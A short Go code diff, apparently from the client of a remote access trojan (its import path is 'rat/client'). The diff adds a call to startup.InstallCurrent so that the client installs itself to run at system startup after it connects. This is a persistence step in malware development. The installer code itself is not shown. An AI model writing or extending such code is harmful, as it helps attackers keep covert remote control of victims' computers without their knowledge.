@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
+	"rat/client/startup"
 	"time"
 )
 
@@ -11,6 +12,11 @@ func main() {
 	if err != nil {
 		fmt.Println(err.Error())
 		return
+	}
+
+	err = startup.InstallCurrent(Config.Name)
+	if err != nil {
+		fmt.Println("Install failed:", err.Error())
 	}
 
 	for {
